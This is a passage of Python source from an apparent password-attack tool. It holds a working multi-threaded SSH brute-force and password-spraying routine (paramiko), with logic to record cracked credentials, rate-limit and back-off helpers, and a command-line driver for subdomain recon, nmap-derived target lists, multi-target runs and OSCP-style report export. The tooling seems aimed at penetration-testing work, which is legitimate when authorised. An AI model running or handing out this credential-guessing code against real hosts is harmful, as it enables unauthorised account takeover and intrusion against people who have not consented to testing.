		host = cfg.get('ssh_host') or (urlparse(cfg.get('url') or '').hostname or '')
		port = int(cfg.get('ssh_port') or 22)
		stop_event = threading.Event()
		q = queue.Queue(maxsize=2000)
		lock = threading.Lock()
		def producer(it):
			try:
				for pair in it:
					if self.cancel_requested or stop_event.is_set():
						break
					try:
						q.put(pair, timeout=0.5)
					except queue.Full:
						continue
			except Exception as exc:
				self.ui_queue.put(("log", f"SSH producer error: {exc}"))
			finally:
				for _ in range(int(cfg.get('concurrency') or 2)):
					try:
						q.put_nowait((None, None))
					except Exception:
						pass
		def attempt(user: str, pwd: str) -> tuple[bool, bool, bool, int]:
			t0 = time.time()
			try:
				client = paramiko.SSHClient()
				client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				limiter.acquire()
				self._wait_global_backoff()
				client.connect(hostname=host, port=port, username=user, password=pwd, timeout=cfg.get('timeout') or 10.0, allow_agent=False, look_for_keys=False)
				client.close()
				lat = int((time.time() - t0) * 1000)
				return True, False, False, lat
			except Exception as exc:
				lat = int((time.time() - t0) * 1000)
				if SSHAuthException is not None and isinstance(exc, SSHAuthException):
					return False, False, False, lat
				return False, False, True, lat
		def worker(wid: int):
			nonlocal completed, found_msg
			while not self.cancel_requested and not stop_event.is_set():
				try:
					user, pwd = q.get(timeout=0.5)
				except queue.Empty:
					continue
				if user is None:
					break
				ok, locked, error, lat = attempt(user, pwd)
				self._record_attempt(lat/1000.0, None, ok, locked, error)
				if self._check_failfast(cfg):
					stop_event.set(); break
				with lock:
					completed += 1
					if completed <= 50:
						self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
				if ok:
					found_msg = f"SUCCESS (SSH {host}:{port}): {user} / {pwd}"
					try:
						self.found_credentials.append({
							"timestamp": datetime.now().isoformat(timespec='seconds'),
							"protocol": "SSH",
							"host": host,
							"port": port,
							"username": user,
							"password": pwd,
							"status": "",
							"latency_ms": lat,
						})
					except Exception:
						pass
					self.ui_queue.put(("log", found_msg))
					stop_event.set()
					break
		threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(int(cfg.get('concurrency') or 2))]
		# Build iterable of pairs
		if cfg.get('spray_enabled'):
			pairs = ((u, p) for u in (cfg.get('usernames') or []) for p in (cfg.get('spray_passwords') or []))
		else:
			fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
			if mode == 'Brute-force':
				pw_iter = self._bruteforce_stream(min_len, max_len)
			elif mode == 'Smart brute-force':
				pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
			else:
				pw_iter = self._smart_candidates(min_len, max_len)
			pairs = ((fixed_users[0], pw) for pw in pw_iter)
		prod = threading.Thread(target=producer, args=(pairs,), daemon=True)
		prod.start()
		for t in threads:
			t.start()
		try:
			q.join()
		except Exception:
			pass
		stop_event.set()
		for t in threads:
			try:
				t.join(timeout=1.0)
			except Exception:
				pass
		if not found_msg:
			found_msg = f"SSH run finished. Attempts: {completed:,}. No success."
		return completed, found_msg

	def _check_failfast(self, cfg: dict) -> bool:
		if not bool(self.var_failfast_enabled.get()):
			return False
		try:
			window = int(self.var_failfast_window_sec.get() or 60)
			threshold = float(self.var_failfast_error_pct.get() or 100.0) / 100.0
			now = time.time()
			with self.metrics_lock:
				ats = [t for t in self.metrics["attempt_timestamps"] if now - t <= window]
				errs = [t for t in self.metrics["error_timestamps"] if now - t <= window]
				attempts = len(ats)
				errors = len(errs)
			if attempts >= 5 and attempts > 0 and (errors / attempts) >= threshold:
				action = (self.var_failfast_action.get() or 'stop').lower()
				pct = int((errors/attempts)*100)
				if action == 'backoff':
					sec = int(self.var_failfast_backoff_sec.get() or 30)
					self._trigger_error_backoff(sec)
					self.ui_queue.put(("log", f"[Fail-fast] Error rate {pct}% over last {window}s; backing off for ~{sec}s"))
					return False
				else:
					self.cancel_requested = True
					self.ui_queue.put(("log", f"[Fail-fast] Error rate {pct}% over last {window}s; stopping."))
					return True
		except Exception:
			return False
		return False

	def _trigger_error_backoff(self, seconds: int) -> None:
		try:
			with self._error_backoff_lock:
				self._error_backoff_until[0] = max(self._error_backoff_until[0], time.time() + max(1, int(seconds)))
		except Exception:
			pass

	def _wait_global_backoff(self) -> None:
		try:
			while not self.cancel_requested:
				with self._error_backoff_lock:
					t = self._error_backoff_until[0]
				now = time.time()
				if now >= t:
					return
				time.sleep(0.2)
		except Exception:
			return


if __name__ == "__main__":
	parser = argparse.ArgumentParser(add_help=True)
	parser.add_argument('--profile', dest='cli_profile', help='Run in CLI mode with the given profile JSON')
	parser.add_argument('--out-dir', dest='out_dir', help='Output directory (evidence bundle, recon output)')
	parser.add_argument('--bundle-dir', dest='bundle_dir', help='Evidence bundle output directory (defaults to --out-dir)')
	parser.add_argument('--report-md', dest='report_md', help='Path to write OSCP Markdown report')
	parser.add_argument('--report-docx', dest='report_docx', help='Path to write OSCP DOCX report')
	parser.add_argument('--docx-template', dest='docx_template', help='Path to a DOCX template (or set DOCX_TEMPLATE env)')
	parser.add_argument('--aggregate-md', dest='agg_md', help='Path to write aggregated Markdown for multi-target runs')
	parser.add_argument('--aggregate-docx', dest='agg_docx', help='Path to write aggregated DOCX for multi-target runs')
	parser.add_argument('--targets-file', dest='targets_file', help='Text file with one host/URL per line')
	parser.add_argument('--nmap-xml', dest='nmap_xml', help='Nmap -oX output to extract HTTP targets')
	parser.add_argument('--recon', dest='recon_domain', help='Run subdomain recon for a domain (e.g., example.com)')
	parser.add_argument('--wordlist', dest='wordlist', help='Wordlist for subdomains (default: wordlist.txt in repo)')
	parser.add_argument('--max-subs', dest='max_subs', type=int, default=1000, help='Max subdomains to scan from wordlist')
	parser.add_argument('--no-gui', dest='no_gui', action='store_true', help='Try to hide the GUI window (withdraw)')
	args, _ = parser.parse_known_args()
	# CLI branches
	if args.cli_profile or args.recon_domain or args.targets_file or args.nmap_xml:
		# Recon first if requested
		if args.recon_domain:
			wl = args.wordlist or os.path.join(os.path.dirname(__file__), 'wordlist.txt')
			out_dir = args.out_dir or os.getcwd()
			run_recon_cli(args.recon_domain, wl, out_dir, max_subs=int(args.max_subs or 1000))
		# Multi-target orchestration
		if args.cli_profile and (args.targets_file or args.nmap_xml):
			targets: list[str] = []
			if args.targets_file:
				targets.extend(_parse_targets_file(args.targets_file))
			if args.nmap_xml:
				targets.extend(_parse_nmap_xml_targets(args.nmap_xml))
			targets = [t for t in targets if t]
			if not targets:
				print("[multi] No targets found", file=sys.stderr)
				sys.exit(1)
			# Apply docx template flag if provided
			if args.docx_template:
				os.environ['DOCX_TEMPLATE'] = args.docx_template
			run_multi_targets_cli(args.cli_profile, targets, args.out_dir or os.getcwd(), args.agg_md, args.agg_docx, no_gui=bool(args.no_gui))
			sys.exit(0)
		# Single profile-driven CLI
		if args.cli_profile:
			app = PasswordListGeneratorApp()
			try:
				if args.no_gui:
					app.root.withdraw()
			except Exception:
				pass
			if args.docx_template:
				app.var_docx_template_path.set(args.docx_template)
			app.load_profile_from_file(args.cli_profile)
			app.on_generate()
			if app.worker_thread:
				try:
					while app.worker_thread.is_alive():
						app.worker_thread.join(timeout=0.5)
				except KeyboardInterrupt:
					app.cancel_requested = True
					if app.worker_thread:
						app.worker_thread.join()
			bundle_dir = args.bundle_dir or args.out_dir
			if bundle_dir:
				os.makedirs(bundle_dir, exist_ok=True)
				app.export_evidence_bundle_to_dir(bundle_dir)
			if args.report_md:
				app.export_oscp_markdown_to(args.report_md)
			if args.report_docx:
				app.export_oscp_docx_to(args.report_docx)
			sys.exit(0)
	# GUI mode
	app = PasswordListGeneratorApp()
	app.run()
